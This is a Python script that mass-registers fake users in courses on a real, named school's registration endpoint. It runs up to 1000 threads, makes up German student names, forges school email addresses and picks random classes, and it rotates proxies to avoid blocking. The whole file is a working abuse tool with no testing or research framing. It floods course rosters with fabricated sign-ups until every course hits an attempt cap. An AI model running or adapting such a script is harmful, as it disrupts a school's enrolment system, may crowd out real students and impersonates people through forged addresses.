import requests
import json
import threading
import random
import os
import time
from faker import Faker
from queue import Queue
from collections import defaultdict

# Global vars
proxy_queue = Queue()
total_logins = [0]
login_lock = threading.Lock()
run_event = threading.Event()
run_event.set()  # This enables the threads to keep running
max_attempts = 100
attempts_per_course = defaultdict(int)

fake = Faker("de_DE")

# List of classes
classes = ["5A", "6A", "7A", "7E", "7EM", "7N", "8A", "8E", "8EM", "8N", "9A", "9E", "9EM", "9N", "10A", "10E", "10EM", "10N", "11", "12"]

course_ids = []
course_lock = threading.Lock()
proxy_list = []

def update_course_ids():
    global course_ids
    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    while run_event.is_set():
        try:
            response = requests.get("https://hm.helmholtzschule.de/script/register-user.php", headers=headers, timeout=10)
            
            # Ignore the status code — parse response anyway
            try:
                data = response.json()
            except ValueError:
                data = json.loads(response.text)

            with course_lock:
                course_ids = [entry["course_id"] for entry in data if "course_id" in entry]
            print(f"Updated course IDs: {len(course_ids)} found.")

        except Exception as e:
            print(f"Error updating course IDs: {e}")
        time.sleep(10)


def read_proxies_from_file(filename="proxies.txt"):
    """Reads proxies from file into a list for random selection."""
    global proxy_list
    if os.path.exists(filename) and os.path.getsize(filename) > 0:
        with open(filename, 'r') as file:
            proxy_list = [line.strip() for line in file if line.strip()]
        print(f"Loaded {len(proxy_list)} proxies.")
    else:
        print("No proxies found or the file is empty. Proceeding without proxies.")

def generate_name_and_email():
    full_name = fake.name()
    first_name = full_name.split()[0]
    last_name = full_name.split()[-1]
    email = f"{last_name.lower()}{first_name[0].lower()}@helmholtzschule.de"
    return f"{first_name} {last_name}", email

def get_thread_count():
    while True:
        try:
            thread_count = int(input("Enter the number of threads (between 1 and 1000): "))
            if 1 <= thread_count <= 1000:
                return thread_count
            else:
                print("Please enter a number between 1 and 1000.")
        except ValueError:
            print("Invalid input. Please enter an integer.")

def check_all_courses_blacklisted():
    """Check if all courses have been blacklisted (max_attempts reached)."""
    with course_lock:
        for course_id in course_ids:
            if attempts_per_course[course_id] < max_attempts:
                return False  # If any course hasn't reached max attempts, return False
    return True  # All courses have been blacklisted

def register_user():
    thread_name = threading.current_thread().name.replace("Thread-", "")
    
    while run_event.is_set():
        proxy = random.choice(proxy_list) if proxy_list else None
        proxies = {"http": proxy, "https": proxy} if proxy else None

        with course_lock:
            if not course_ids:
                print(f"Thread {thread_name}: Waiting for course list...")
                time.sleep(2)
                continue
            course_id = random.choice(course_ids)

            # Check if the course has reached the max attempts, skip it if so
            if attempts_per_course[course_id] >= max_attempts:
                print(f"Thread {thread_name}: Skipping course {course_id} as it has reached the max attempts.")
                continue  # Skip this course and pick another course in the next loop

        name, email = generate_name_and_email()
        random_class = random.choice(classes)

        payload = {
            "course_id": course_id,
            "method": "USER",
            "name": name,
            "email": email,
            "class": random_class
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }

        try:
            response = requests.post(
                "https://hm.helmholtzschule.de/script/register-user.php",
                headers=headers,
                data=json.dumps(payload),
                proxies=proxies,
                timeout=15
            )

            attempts_per_course[course_id] += 1

            with login_lock:
                total_logins[0] += 1
            print(f"Thread {thread_name}: Status {response.status_code} | Course: {course_id} | Proxy: {proxy if proxy else 'None'} | Class: {random_class}")
        except Exception as e:
            print(f"Thread {thread_name}: Error with proxy {proxy}: {e}")
        finally:
            continue  # Keep going until Ctrl+C

if __name__ == "__main__":
    read_proxies_from_file()
    num_threads = get_thread_count()

    # Start course updater thread
    updater = threading.Thread(target=update_course_ids, daemon=True)
    updater.start()

    # Wait for course_ids to populate
    print("Waiting for course list to populate...")
    while not course_ids and run_event.is_set():
        time.sleep(0.5)

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=register_user, name=f"Thread-{i+1}", daemon=True)
        t.start()
        threads.append(t)

    try:
        while run_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping threads... Please wait.")
        run_event.clear()
        for t in threads:
            t.join()
        print(f"All threads stopped. Total successful registrations: {total_logins[0]}")

